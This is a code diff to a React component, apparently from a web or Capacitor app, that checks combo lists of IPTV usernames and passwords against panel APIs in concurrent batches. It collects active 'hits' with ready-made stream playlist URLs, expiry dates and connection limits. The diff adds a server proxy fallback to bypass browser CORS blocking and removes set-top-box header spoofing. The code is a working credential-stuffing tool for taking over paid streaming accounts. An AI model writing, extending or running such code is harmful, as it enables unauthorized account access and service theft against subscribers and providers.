@@ -4,9 +4,10 @@ import { useState, useCallback, useRef } from 'react'
 import { motion, AnimatePresence } from 'framer-motion'
 import {
   Copy, Play, Square, Loader2, Upload, ExternalLink,
-  RotateCcw, ChevronDown, ChevronUp, X, Save, FolderOpen
+  ChevronDown, ChevronUp, X, Save, FolderOpen
 } from 'lucide-react'
 import { toast } from 'sonner'
+import { apiFetch } from '@/lib/api-config'
 
 // ============================================================
 // Types
@@ -47,19 +48,6 @@ interface SavedSession {
 }
 
 // ============================================================
-// STB Headers (same as server-side)
-// ============================================================
-
-const STB_HEADERS: Record<string, string> = {
-  'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
-  'X-User-Agent': 'Model: MAG254; Link: Ethernet',
-  'Connection': 'Keep-Alive',
-  'Accept-Encoding': 'gzip, deflate',
-  'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-  'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
-}
-
-// ============================================================
 // Helpers
 // ============================================================
 
@@ -76,8 +64,11 @@ function formatDate(val: string | number | null | undefined): string {
   return String(val)
 }
 
-/** Check a single IPTV line DIRECTLY from the client */
-async function checkLineDirect(
+/**
+ * Check a single IPTV line.
+ * Strategy: Try direct fetch first. If CORS blocks it, use the Vercel proxy route.
+ */
+async function checkLine(
   line: string,
   inputMode: 'url' | 'combo',
   serverHost: string
@@ -91,8 +82,7 @@ async function checkLineDirect(
     if (parts.length < 2) return { status: 'bad', host: '', username: '', url: '' }
     username = parts[0].trim()
     password = parts.slice(1).join(':').trim()
-    let h = serverHost.replace(/^https?:\/\//, '').replace(/\/.*$/, '')
-    sHost = h
+    sHost = serverHost.replace(/^https?:\/\//, '').replace(/\/.*$/, '')
   } else {
     let parsedUrl: URL
     try {
@@ -108,82 +98,118 @@ async function checkLineDirect(
     if (!username || !password) return { status: 'bad', host: '', username: '', url: '' }
   }
 
-  const apiUrl = `http://${sHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u`
+  const checkUrl = `http://${sHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u`
 
+  // Parse the IPTV response text
+  const parseIptvResponse = (text: string): Omit<IptvResult, 'id'> | null => {
+    if (!text.includes('username')) return null
+
+    try {
+      const json = JSON.parse(text)
+      const userInfo = json?.user_info || {}
+      const serverInfo = json?.server_info || {}
+      const accountStatus = String(userInfo.status || '')
+
+      if (accountStatus === 'Active') {
+        const m3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
+        return {
+          status: 'hit',
+          url: m3uUrl,
+          host: sHost,
+          username,
+          password,
+          info: {
+            status: userInfo.status || 'Active',
+            active_cons: String(userInfo.active_cons ?? '0'),
+            max_connections: String(userInfo.max_connections ?? '0'),
+            created_at: formatDate(userInfo.created_at),
+            exp_date: formatDate(userInfo.exp_date),
+            timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
+            channels: 'N/A',
+            films: 'N/A',
+            series: 'N/A',
+            real_url: serverInfo?.url ? String(serverInfo.url) : '',
+            real_port: serverInfo?.port ? String(serverInfo.port) : '',
+            m3u_url: m3uUrl,
+          },
+        }
+      }
+    } catch {
+      if (text.includes('Active')) {
+        const fallbackM3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
+        return {
+          status: 'hit',
+          url: fallbackM3uUrl,
+          host: sHost,
+          username,
+          password,
+          info: {
+            status: 'Active',
+            active_cons: '0',
+            max_connections: '0',
+            created_at: 'N/A',
+            exp_date: 'N/A',
+            timezone: 'N/A',
+          },
+        }
+      }
+    }
+    return null
+  }
+
+  // ---- Strategy 1: Try direct fetch (fastest, works in Capacitor without CORS issues) ----
   try {
     const controller = new AbortController()
     const timeoutId = setTimeout(() => controller.abort(), 15000)
 
-    const response = await fetch(apiUrl, {
+    const response = await fetch(checkUrl, {
       signal: controller.signal,
-      headers: STB_HEADERS,
+      mode: 'cors',
     })
 
     clearTimeout(timeoutId)
     const text = await response.text()
 
-    if (text.includes('username')) {
-      try {
-        const json = JSON.parse(text)
-        const userInfo = json?.user_info || {}
-        const serverInfo = json?.server_info || {}
-        const accountStatus = String(userInfo.status || '')
-
-        if (accountStatus === 'Active') {
-          const m3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
-          const realUrl = serverInfo?.url ? String(serverInfo.url) : ''
-          const realPort = serverInfo?.port ? String(serverInfo.port) : ''
-
-          return {
-            status: 'hit',
-            url: m3uUrl,
-            host: sHost,
-            username,
-            password,
-            info: {
-              status: userInfo.status || 'Active',
-              active_cons: String(userInfo.active_cons ?? '0'),
-              max_connections: String(userInfo.max_connections ?? '0'),
-              created_at: formatDate(userInfo.created_at),
-              exp_date: formatDate(userInfo.exp_date),
-              timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
-              channels: 'N/A',
-              films: 'N/A',
-              series: 'N/A',
-              real_url: realUrl,
-              real_port: realPort,
-              m3u_url: m3uUrl,
-            },
-          }
-        }
-      } catch {
-        if (text.includes('Active')) {
-          const fallbackM3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
-          return {
-            status: 'hit',
-            url: fallbackM3uUrl,
-            host: sHost,
-            username,
-            password,
-            info: {
-              status: 'Active',
-              active_cons: '0',
-              max_connections: '0',
-              created_at: 'N/A',
-              exp_date: 'N/A',
-              timezone: 'N/A',
-            },
-          }
-        }
-      }
-    }
+    const hitResult = parseIptvResponse(text)
+    if (hitResult) return hitResult
 
     return { status: 'bad', host: sHost, username, url: '' }
-  } catch (fetchError: unknown) {
-    if (fetchError instanceof DOMException && fetchError.name === 'AbortError') {
+  } catch (directError: unknown) {
+    // If it's a timeout, return timeout immediately
+    if (directError instanceof DOMException && directError.name === 'AbortError') {
       return { status: 'timeout', host: sHost, username, url: '' }
     }
-    return { status: 'bad', host: sHost, username, url: '' }
+
+    // ---- Strategy 2: Use Vercel proxy (bypasses CORS + mixed content) ----
+    try {
+      const proxyRes = await apiFetch('/api/iptv/check', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ url: checkUrl }),
+      })
+
+      const data = await proxyRes.json()
+
+      // Proxy returned a timeout or connection error
+      if (data.status === 'timeout') {
+        return { status: 'timeout', host: sHost, username, url: '' }
+      }
+      if (data.status === 'bad') {
+        return { status: 'bad', host: sHost, username, url: '' }
+      }
+      if (data.error && !data.rawText) {
+        return { status: 'bad', host: sHost, username, url: '' }
+      }
+
+      const text = data.rawText || ''
+      const hitResult = parseIptvResponse(text)
+      if (hitResult) return hitResult
+
+      return { status: 'bad', host: sHost, username, url: '' }
+    } catch (proxyError: unknown) {
+      // Both failed
+      return { status: 'bad', host: sHost, username, url: '' }
+    }
   }
 }
 
@@ -206,12 +232,9 @@ function getSavedSessions(): SavedSession[] {
 function saveSessions(sessions: SavedSession[]) {
   if (typeof window === 'undefined') return
   try {
-    // Keep only last 20 sessions
     const trimmed = sessions.slice(-20)
     localStorage.setItem(STORAGE_KEY, JSON.stringify(trimmed))
-  } catch {
-    // localStorage full, ignore
-  }
+  } catch { /* full */ }
 }
 
 function saveCurrentSession(session: SavedSession) {
@@ -309,7 +332,7 @@ export function IptvChecker() {
     e.target.value = ''
   }, [])
 
-  // ---- Start check (ALL CLIENT-SIDE) ----
+  // ---- Start check (DIRECT + PROXY FALLBACK) ----
   const startCheck = useCallback(async () => {
     const allLines = comboList.trim().split('\n').filter(l => l.trim())
     if (allLines.length === 0) {
@@ -336,7 +359,9 @@ export function IptvChecker() {
     let processed = 0
     let hits = 0
     let bad = 0
-    let timeout = 0
+    let timeoutCount = 0
+
+    toast.info(`Verificando ${totalLines} líneas...`)
 
     // Process in batches
     for (let i = 0; i < allLines.length; i += concurrency) {
@@ -345,7 +370,7 @@ export function IptvChecker() {
       const batch = allLines.slice(i, i + concurrency)
       const batchPromises = batch.map(async (line, idx) => {
         if (stopRef.current) return null
-        const result = await checkLineDirect(line.trim(), inputMode, serverHost.trim())
+        const result = await checkLine(line.trim(), inputMode, serverHost.trim())
         return {
           id: `line-${i + idx}-${Date.now()}`,
           url: result.url || line.trim(),
@@ -364,7 +389,7 @@ export function IptvChecker() {
       for (const r of validResults) {
         processed++
         if (r.status === 'hit') hits++
-        else if (r.status === 'timeout') timeout++
+        else if (r.status === 'timeout') timeoutCount++
         else bad++
       }
 
@@ -373,7 +398,7 @@ export function IptvChecker() {
       resultsRef.current = newResults
       setResults(newResults)
 
-      const newStats = { total: processed, hits, bad, timeout, totalLines }
+      const newStats = { total: processed, hits, bad, timeout: timeoutCount, totalLines }
       statsRef.current = newStats
       setStats(newStats)
       setProgress(totalLines > 0 ? Math.round((processed / totalLines) * 100) : 0)
@@ -395,10 +420,10 @@ export function IptvChecker() {
     setIsRunning(false)
     stopRef.current = false
 
-    if (!stopRef.current || processed === totalLines) {
-      toast.success(`Verificación completada: ${hits} hits`)
+    if (processed === totalLines) {
+      toast.success(`Verificación completada: ${hits} hits, ${bad} bad, ${timeoutCount} timeout`)
     } else {
-      toast.info('Verificación cancelada')
+      toast.info(`Verificación cancelada: ${hits} hits encontrados`)
     }
   }, [comboList, inputMode, serverHost, threads])
 
@@ -406,6 +431,7 @@ export function IptvChecker() {
   const stopCheck = useCallback(() => {
     stopRef.current = true
     setIsRunning(false)
+    toast.info('Cancelando verificación...')
   }, [])
 
   // ---- Save hits to file ----
